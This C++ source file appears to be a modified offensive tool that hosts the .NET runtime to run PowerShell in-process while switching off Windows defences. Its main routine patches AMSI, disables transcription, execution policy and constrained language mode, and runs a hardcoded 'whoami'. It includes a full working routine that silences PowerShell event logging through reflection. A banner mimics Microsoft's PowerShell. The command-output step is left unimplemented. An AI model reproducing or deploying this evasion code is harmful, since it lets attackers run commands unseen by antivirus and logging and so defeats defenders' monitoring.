#include "powershell.h"
#include "common.h"
#include "patch.h"

void StartPowerShell()
{
    mscorlib::_AppDomain* pAppDomain = NULL;
    CLR_CONTEXT cc = { 0 };
    VARIANT vtInitialRunspaceConfiguration = { 0 };
    LPCWSTR pwszBannerText = L"Windows PowerChell\nCopyright (C) Microsoft Corporation. All rights reserved.";
    LPCWSTR pwszHelpText = L"Help message";
    LPCWSTR ppwszArguments[] = { NULL };
    BSTR pwszOutput = NULL;
    LPCWSTR pwszCommand = L"whoami | out-file out.log";

    if (!InitializeCommonLanguageRuntime(&cc, &pAppDomain))
        goto exit;

    if (!CreateInitialRunspaceConfiguration(pAppDomain, &vtInitialRunspaceConfiguration))
        goto exit;

    if (!PatchAmsiOpenSession())
        PRINT_ERROR("Failed to disable AMSI (1).\n");

    if (!PatchAmsiScanBuffer())
        PRINT_ERROR("Failed to disable AMSI (2).\n");

    if (!DisablePowerShellEtwProvider(pAppDomain))
        PRINT_ERROR("Failed to disable ETW Provider.\n");

    if (!PatchTranscriptionOptionFlushContentToDisk(pAppDomain))
        PRINT_ERROR("Failed to disable Transcription.\n");

    if (!PatchAuthorizationManagerShouldRunInternal(pAppDomain))
        PRINT_ERROR("Failed to disable Execution Policy enforcement.\n");

    if (!PatchSystemPolicyGetSystemLockdownPolicy(pAppDomain))
        PRINT_ERROR("Failed to disable Constrained Mode Language.\n");

    //if (!StartConsoleShell(pAppDomain, &vtInitialRunspaceConfiguration, pwszBannerText, pwszHelpText, ppwszArguments, ARRAYSIZE(ppwszArguments)))
    //    goto exit;

    // Call our function instead of StartConsoleShell
    if (!ExecutePowerShellCommand(pAppDomain, &vtInitialRunspaceConfiguration, pwszCommand, &pwszOutput))
        goto exit;

    // Do something with the output
    // Print the output using our new function
    PrintPowerShellOutput(pwszOutput);

exit:
    VariantClear(&vtInitialRunspaceConfiguration);
    DestroyCommonLanguageRuntime(&cc, pAppDomain);
}

//
// The following function retrieves an instance of the PSEtwLogProvider class, gets
// the value of its 'etwProvider' member, which is an EventProvider object, and sets
// the 'm_enabled' attribute of this latter object to 0, thus effectively disabling
// all PowerShell event logs in the current process. This includes Script Block
// Logging and Module Logging.
// 
// Credit:
//   - https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
//
BOOL DisablePowerShellEtwProvider(mscorlib::_AppDomain* pAppDomain)
{
    BOOL bResult = FALSE;
    HRESULT hr;
    BSTR bstrPsEtwLogProviderFullName = SysAllocString(L"System.Management.Automation.Tracing.PSEtwLogProvider");
    BSTR bstrEtwProviderFieldName = SysAllocString(L"etwProvider");
    BSTR bstrEventProviderFullName = SysAllocString(L"System.Diagnostics.Eventing.EventProvider");
    BSTR bstrEnabledFieldName = SysAllocString(L"m_enabled");
    VARIANT vtEmpty = { 0 };
    VARIANT vtPsEtwLogProviderInstance = { 0 };
    VARIANT vtZero = { 0 };
    mscorlib::_Assembly* pCoreAssembly = NULL;
    mscorlib::_Assembly* pAutomationAssembly = NULL;
    mscorlib::_Type* pPsEtwLogProviderType = NULL;
    mscorlib::_FieldInfo* pEtwProviderFieldInfo = NULL;
    mscorlib::_Type* pEventProviderType = NULL;
    mscorlib::_FieldInfo* pEnabledInfo = NULL;

    if (!LoadAssembly(pAppDomain, ASSEMBLY_NAME_SYSTEM_CORE, &pCoreAssembly))
        goto exit;

    if (!LoadAssembly(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, &pAutomationAssembly))
        goto exit;

    hr = pAutomationAssembly->GetType_2(bstrPsEtwLogProviderFullName, &pPsEtwLogProviderType);
    EXIT_ON_HRESULT_ERROR(L"Assembly->GetType_2", hr);
    EXIT_ON_NULL_POINTER(L"PSEtwLogProvider type", pPsEtwLogProviderType);

    hr = pPsEtwLogProviderType->GetField(
        bstrEtwProviderFieldName,
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Static | mscorlib::BindingFlags::BindingFlags_NonPublic),
        &pEtwProviderFieldInfo
    );

    EXIT_ON_HRESULT_ERROR(L"Type->GetField", hr);

    hr = pEtwProviderFieldInfo->GetValue(vtEmpty, &vtPsEtwLogProviderInstance);
    EXIT_ON_HRESULT_ERROR(L"FieldInfo->GetValue", hr);

    hr = pCoreAssembly->GetType_2(bstrEventProviderFullName, &pEventProviderType);
    EXIT_ON_HRESULT_ERROR(L"Assembly->GetType_2", hr);
    EXIT_ON_NULL_POINTER(L"EventProvider type", pEventProviderType);

    hr = pEventProviderType->GetField(
        bstrEnabledFieldName,
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Instance | mscorlib::BindingFlags::BindingFlags_NonPublic),
        &pEnabledInfo
    );

    EXIT_ON_HRESULT_ERROR(L"Type->GetField", hr);

    InitVariantFromInt32(0, &vtZero);

    hr = pEnabledInfo->SetValue_2(vtPsEtwLogProviderInstance, vtZero);
    EXIT_ON_HRESULT_ERROR(L"FieldInfo->SetValue", hr);

    bResult = TRUE;

exit:
    if (bstrEnabledFieldName) SysFreeString(bstrEnabledFieldName);
    if (bstrEventProviderFullName) SysFreeString(bstrEventProviderFullName);
    if (bstrEtwProviderFieldName) SysFreeString(bstrEtwProviderFieldName);
    if (bstrPsEtwLogProviderFullName) SysFreeString(bstrPsEtwLogProviderFullName);

    if (pEnabledInfo) pEnabledInfo->Release();
    if (pEventProviderType) pEventProviderType->Release();
    if (pEtwProviderFieldInfo) pEtwProviderFieldInfo->Release();
    if (pPsEtwLogProviderType) pPsEtwLogProviderType->Release();
    if (pAutomationAssembly) pAutomationAssembly->Release();
    if (pCoreAssembly) pCoreAssembly->Release();

    VariantClear(&vtPsEtwLogProviderInstance);

    return bResult;
}

BOOL CreateInitialRunspaceConfiguration(mscorlib::_AppDomain* pAppDomain, VARIANT* pvtRunspaceConfiguration)
{
    HRESULT hr;
    BOOL bResult = FALSE;
    BSTR bstrRunspaceConfigurationFullName = SysAllocString(L"System.Management.Automation.Runspaces.RunspaceConfiguration");
    BSTR bstrRunspaceConfigurationName = SysAllocString(L"RunspaceConfiguration");
    SAFEARRAY* pRunspaceConfigurationMethods = NULL;
    VARIANT vtEmpty = { 0 };
    VARIANT vtResult = { 0 };
    mscorlib::_Assembly* pAutomationAssembly = NULL;
    mscorlib::_Type* pRunspaceConfigurationType = NULL;
    mscorlib::_MethodInfo* pCreateInfo = NULL;

    if (!LoadAssembly(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, &pAutomationAssembly))
        goto exit;

    hr = pAutomationAssembly->GetType_2(bstrRunspaceConfigurationFullName, &pRunspaceConfigurationType);
    EXIT_ON_HRESULT_ERROR(L"Assembly->GetType_2", hr);
    EXIT_ON_NULL_POINTER(L"RunspaceConfiguration type", pRunspaceConfigurationType);

    hr = pRunspaceConfigurationType->GetMethods(
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Static | mscorlib::BindingFlags::BindingFlags_Public),
        &pRunspaceConfigurationMethods
    );

    EXIT_ON_HRESULT_ERROR(L"Type->GetMethods", hr);

    if (!FindMethodInArray(pRunspaceConfigurationMethods, L"Create", 0, &pCreateInfo))
        goto exit;

    if (!pCreateInfo)
    {
        wprintf(L"[-] Method RunspaceConfiguration.Create() not found.\n");
        goto exit;
    }

    hr = pCreateInfo->Invoke_3(vtEmpty, NULL, &vtResult);
    EXIT_ON_HRESULT_ERROR(L"MethodInfo->Invoke_3", hr);

    memcpy_s(pvtRunspaceConfiguration, sizeof(*pvtRunspaceConfiguration), &vtResult, sizeof(vtResult));
    bResult = TRUE;

exit:
    if (bstrRunspaceConfigurationFullName) SysFreeString(bstrRunspaceConfigurationFullName);
    if (bstrRunspaceConfigurationName) SysFreeString(bstrRunspaceConfigurationName);

    if (pRunspaceConfigurationMethods) SafeArrayDestroy(pRunspaceConfigurationMethods);

    if (pRunspaceConfigurationType) pRunspaceConfigurationType->Release();
    if (pAutomationAssembly) pAutomationAssembly->Release();

    return bResult;
}

BOOL StartConsoleShell(mscorlib::_AppDomain* pAppDomain, VARIANT* pvtRunspaceConfiguration, LPCWSTR pwszBanner, LPCWSTR pwszHelp, LPCWSTR* ppwszArguments, DWORD dwArgumentCount)
{
    BOOL bResult = FALSE;
    LONG lArgumentIndex;
    HRESULT hr;
    BSTR bstrConsoleShellFullName = SysAllocString(L"Microsoft.PowerShell.ConsoleShell");
    BSTR bstrConsoleShellName = SysAllocString(L"ConsoleShell");
    BSTR bstrConsoleShellMethodName = SysAllocString(L"Start");
    VARIANT vtEmpty = { 0 };
    VARIANT vtResult = { 0 };
    VARIANT vtBannerText = { 0 };
    VARIANT vtHelpText = { 0 };
    VARIANT vtArguments = { 0 };
    SAFEARRAY* pConsoleShellMethods = NULL;
    SAFEARRAY* pStartArguments = NULL;
    mscorlib::_Assembly* pConsoleHostAssembly = NULL;
    mscorlib::_Type* pConsoleShellType = NULL;
    mscorlib::_MethodInfo* pStartMethodInfo = NULL;

    if (!LoadAssembly(pAppDomain, ASSEMBLY_NAME_MICROSOFT_POWERSHELL_CONSOLEHOST, &pConsoleHostAssembly))
        goto exit;

    hr = pConsoleHostAssembly->GetType_2(bstrConsoleShellFullName, &pConsoleShellType);
    EXIT_ON_HRESULT_ERROR(L"Assembly->GetType_2", hr);
    EXIT_ON_NULL_POINTER(L"ConsoleShell type", pConsoleShellType);

    hr = pConsoleShellType->GetMethods(
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Static | mscorlib::BindingFlags::BindingFlags_Public),
        &pConsoleShellMethods
    );

    EXIT_ON_HRESULT_ERROR(L"Type->GetMethods", hr);

    if (!FindMethodInArray(pConsoleShellMethods, L"Start", 4, &pStartMethodInfo))
        goto exit;

    InitVariantFromString(pwszBanner, &vtBannerText);
    InitVariantFromString(pwszHelp, &vtHelpText);
    InitVariantFromStringArray(ppwszArguments, dwArgumentCount, &vtArguments);

    pStartArguments = SafeArrayCreateVector(VT_VARIANT, 0, 4);

    lArgumentIndex = 0;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, pvtRunspaceConfiguration);
    lArgumentIndex = 1;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtBannerText);
    lArgumentIndex = 2;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtHelpText);
    lArgumentIndex = 3;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtArguments);

    hr = pStartMethodInfo->Invoke_3(vtEmpty, pStartArguments, &vtResult);
    EXIT_ON_HRESULT_ERROR(L"MethodInfo->Invoke_3", hr);

    bResult = TRUE;

exit:
    if (bstrConsoleShellFullName) SysFreeString(bstrConsoleShellFullName);
    if (bstrConsoleShellName) SysFreeString(bstrConsoleShellName);
    if (bstrConsoleShellMethodName) SysFreeString(bstrConsoleShellMethodName);

    if (pStartArguments) SafeArrayDestroy(pStartArguments);
    if (pConsoleShellMethods) SafeArrayDestroy(pConsoleShellMethods);

    if (pConsoleShellType) pConsoleShellType->Release();
    if (pConsoleHostAssembly) pConsoleHostAssembly->Release();

    VariantClear(&vtBannerText);
    VariantClear(&vtHelpText);
    VariantClear(&vtArguments);

    return bResult;
}

BOOL ExecutePowerShellCommand(mscorlib::_AppDomain* pAppDomain, VARIANT* pvtRunspaceConfiguration, LPCWSTR pwszCommand, BSTR* ppwszOutput)
{
    BOOL bResult = FALSE;
    HRESULT hr;

    // Declare all variables at the beginning of the function
    BSTR bstrPowerShellFullName = NULL;
    BSTR bstrObjectFullName = NULL;
    BSTR bstrToStringMethodName = NULL;
    mscorlib::_Assembly* pAutomationAssembly = NULL;
    mscorlib::_Assembly* pMscorlib = NULL;
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_Type* pObjectType = NULL;
    SAFEARRAY* pPowerShellMethods = NULL;
    SAFEARRAY* pObjectMethods = NULL;
    mscorlib::_MethodInfo* pCreateMethodInfo = NULL;
    mscorlib::_MethodInfo* pToStringMethodInfo = NULL;
    VARIANT vtEmpty = { 0 };
    VARIANT vtPowerShellInstance = { 0 };
    SAFEARRAY* pInstanceMethods = NULL;
    mscorlib::_MethodInfo* pAddScriptMethodInfo = NULL;
    mscorlib::_MethodInfo* pInvokeMethodInfo = NULL;
    mscorlib::_MethodInfo* pOutStringMethodInfo = NULL;
    SAFEARRAY* pAddScriptArgs = NULL;
    SAFEARRAY* pOutStringArgs = NULL;
    VARIANT vtAddScriptResult = { 0 };
    VARIANT vtInvokeResult = { 0 };
    VARIANT vtToStringResult = { 0 };
    BSTR bstrCommandString = NULL;
    VARIANT vtCommandString = { 0 };
    LONG lArgumentIndex = 0;

    // Collection handling for ToString operation
    SAFEARRAY* pCollection = NULL;
    LONG lLowerBound = 0, lUpperBound = 0;
    void* pArrayData = NULL;
    VARIANT* pArrayElements = NULL;
    WCHAR wszOutputBuffer[8192] = { 0 };
    size_t currentPos = 0;

    // Initialize output parameter
    if (ppwszOutput)
        *ppwszOutput = NULL;

    // STEP 1: Load the System.Management.Automation assembly and get PowerShell type
    bstrPowerShellFullName = SysAllocString(L"System.Management.Automation.PowerShell");
    if (!bstrPowerShellFullName)
        goto exit;

    if (!LoadAssembly(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, &pAutomationAssembly))
        goto exit;

    hr = pAutomationAssembly->GetType_2(bstrPowerShellFullName, &pPowerShellType);
    EXIT_ON_HRESULT_ERROR(L"Assembly->GetType_2", hr);

    if (!pPowerShellType)
    {
        wprintf(L"[-] PowerShell type not found.\n");
        goto exit;
    }

    // STEP 2: Get the Create method and call it to create a PowerShell instance
    hr = pPowerShellType->GetMethods(
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Static | mscorlib::BindingFlags::BindingFlags_Public),
        &pPowerShellMethods
    );
    EXIT_ON_HRESULT_ERROR(L"Type->GetMethods", hr);

    if (!FindMethodInArray(pPowerShellMethods, L"Create", 0, &pCreateMethodInfo))
    {
        wprintf(L"[-] Method PowerShell.Create() not found.\n");
        goto exit;
    }

    hr = pCreateMethodInfo->Invoke_3(vtEmpty, NULL, &vtPowerShellInstance);
    EXIT_ON_HRESULT_ERROR(L"MethodInfo->Invoke_3 (Create)", hr);

    if (vtPowerShellInstance.vt == VT_EMPTY || vtPowerShellInstance.vt == VT_NULL)
    {
        wprintf(L"[-] PowerShell.Create() returned empty result.\n");
        goto exit;
    }

    // STEP 3: Get instance methods and call AddScript with our command
    hr = pPowerShellType->GetMethods(
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Instance | mscorlib::BindingFlags::BindingFlags_Public),
        &pInstanceMethods
    );
    EXIT_ON_HRESULT_ERROR(L"Type->GetMethods (Instance)", hr);

    if (!FindMethodInArray(pInstanceMethods, L"AddScript", 1, &pAddScriptMethodInfo))
    {
        wprintf(L"[-] Method PowerShell.AddScript() not found.\n");
        goto exit;
    }

    // Create argument array for AddScript call
    pAddScriptArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    if (!pAddScriptArgs)
        goto exit;

    // Prepare the command string
    bstrCommandString = SysAllocString(pwszCommand);
    if (!bstrCommandString)
        goto exit;

    // Put command string into argument array at index 0
    vtCommandString.vt = VT_BSTR;
    vtCommandString.bstrVal = bstrCommandString;

    lArgumentIndex = 0;
    hr = SafeArrayPutElement(pAddScriptArgs, &lArgumentIndex, &vtCommandString);
    EXIT_ON_HRESULT_ERROR(L"SafeArrayPutElement", hr);

    // Call the AddScript method
    hr = pAddScriptMethodInfo->Invoke_3(vtPowerShellInstance, pAddScriptArgs, &vtAddScriptResult);
    EXIT_ON_HRESULT_ERROR(L"MethodInfo->Invoke_3 (AddScript)", hr);

    // STEP 4: Invoke the PowerShell command and get the output
    if (!FindMethodInArray(pInstanceMethods, L"Invoke", 0, &pInvokeMethodInfo))
    {
        wprintf(L"[-] Method PowerShell.Invoke() not found.\n");
        goto exit;
    }

    hr = pInvokeMethodInfo->Invoke_3(vtPowerShellInstance, NULL, &vtInvokeResult);
    EXIT_ON_HRESULT_ERROR(L"MethodInfo->Invoke_3 (Invoke)", hr);

    // STEP 5: Somehow get and print the command's output 

    if (!*ppwszOutput)
    {
        // If we still don't have output, provide a fallback
        *ppwszOutput = SysAllocString(L"Command executed but output retrieval not implemented");
    }

    bResult = TRUE;

exit:
    // Clean up resources
    if (bstrPowerShellFullName) SysFreeString(bstrPowerShellFullName);
    if (bstrCommandString) SysFreeString(bstrCommandString);
    if (pPowerShellMethods) SafeArrayDestroy(pPowerShellMethods);
    if (pInstanceMethods) SafeArrayDestroy(pInstanceMethods);
    if (pAddScriptArgs) SafeArrayDestroy(pAddScriptArgs);
    if (pOutStringArgs) SafeArrayDestroy(pOutStringArgs);
    if (pPowerShellType) pPowerShellType->Release();
    if (pAutomationAssembly) pAutomationAssembly->Release();
    if (pCreateMethodInfo) pCreateMethodInfo->Release();
    if (pAddScriptMethodInfo) pAddScriptMethodInfo->Release();
    if (pInvokeMethodInfo) pInvokeMethodInfo->Release();
    if (pOutStringMethodInfo) pOutStringMethodInfo->Release();
    VariantClear(&vtPowerShellInstance);
    VariantClear(&vtAddScriptResult);
    VariantClear(&vtInvokeResult);
    //VariantClear(&vtOutStringName);

    return bResult;
}

void PrintPowerShellOutput(BSTR pwszOutput)
{
    if (pwszOutput)
    {
        wprintf(L"PowerShell Output:\n");
        wprintf(L"--------------------------------------------------\n");
        wprintf(L"%s\n", pwszOutput);
        wprintf(L"--------------------------------------------------\n");
    }
    else
    {
        wprintf(L"No output received from PowerShell command.\n");
    }
}